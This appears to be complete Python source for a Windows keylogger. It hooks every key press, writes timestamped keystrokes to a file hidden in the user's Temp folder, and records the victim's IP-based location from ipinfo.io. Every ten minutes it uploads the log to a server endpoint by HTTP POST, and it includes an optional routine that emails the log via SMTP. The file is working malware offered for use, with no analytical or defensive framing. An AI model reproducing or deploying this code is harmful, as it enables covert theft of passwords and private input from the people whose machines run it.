from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import keyboard
import threading
import requests
from datetime import datetime
import psutil
import os
import ssl
import urllib3

# removes the future warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# url of the api to send the data.
server_url = "https://localhost:7056/api/Upload/UploadFiles"

# time interval for saving the data every 10 mins
timeInterval = 600.0

# variable that stores the pressed keys during time interval value in seconds
text = ""

# config data for sending mails
host = ""
port = 0
email = ""
password = ""

# stores the windows user name
user_name = psutil.users()[0].name

# stores the path chosen to save the keylogger.txt file
path_to_store = rf"C:\Users\{user_name}\AppData\Local\Temp\Scriptz"


def GetUserInfo():

    global user_name

    # sending a request to api and getting user data
    res = requests.get(url="https://ipinfo.io/json", verify= False)

    if res.status_code != 200:
        return 'Status:', res.status_code, 'Problem with the request. Exiting.'

    data = res.json()
    data["user"] = user_name

    return data


def SendingDataToServer():
    
    global server_url
    global user_name

    file = { f"keylogger.txt" : open(f"{path_to_store}\keylogger_{user_name}.txt", "rb") }

    req = requests.post(url= server_url, files= file, verify= False)

    #print(req.status_code)


def SendingDataToEmail():
   
    global user_name
    global password
    global email
    global port
    global host

    message = MIMEMultipart("alternative")
    message["Subject"] = "Files sent by program (Keylogger)"
    message["From"] = f"Keylogger <{email}>"
    message["To"] = email

    text = open(f"{path_to_store}\keylogger_{user_name}.txt", "r")
    body = MIMEText(text.read(), "plain")
    text.close()

    message.attach(body)

    try:
        context = ssl.create_default_context()

        # setting the smtp object and login
        smtp = smtplib.SMTP(host, port)
        smtp.starttls(context= context)
        smtp.login(email, password)

        # sending the mail to the email
        smtp.sendmail(email, message["To"], message.as_string())

    except Exception:
        return False

    finally:
        smtp.quit()
        return True


def SavingData():

    global text
    global user_name
    global path_to_store
    
    # code for saving pressed keys into keylogger file
    if (text != ""):
        file = open(f"{path_to_store}\keylogger_{user_name}.txt", "a")
        file.write(text)
        file.close()

            #####
            #####
            #####
            #####
         ###########
          #########
           #######
            #####
             ###
              #

        # CODE TO SEND DATA TO SERVER
        SendingDataToServer()


        # CODE TO SEND DATA TO EMAIL
        # SendingDataToEmail()


    # emptys text variable for new keys to press
    text = ""

    # creates a new thread and call SavingData every time interval in seconds
    timer = threading.Timer(timeInterval, SavingData)
    timer.start()


# checks if (the path chosen to save the keylogger.txt) exists if not creates it
if (os.path.isfile(f"{path_to_store}\keylogger_{user_name}.txt") == False):
    os.mkdir(path_to_store)
    file = open(f"{path_to_store}\keylogger_{user_name}.txt", "a")
    file.write(GetUserInfo().__str__()+"\n\n")
    file.close()


# call SavingData to execute internal code and start a new thread
SavingData()

# function that listens key pressed by user
def onKeyPress(event):  

    global text
    text += f"{datetime.now()}: '{event.name}' \n"
    
    
# create an events for key pressed
keyboard.on_press(onKeyPress)
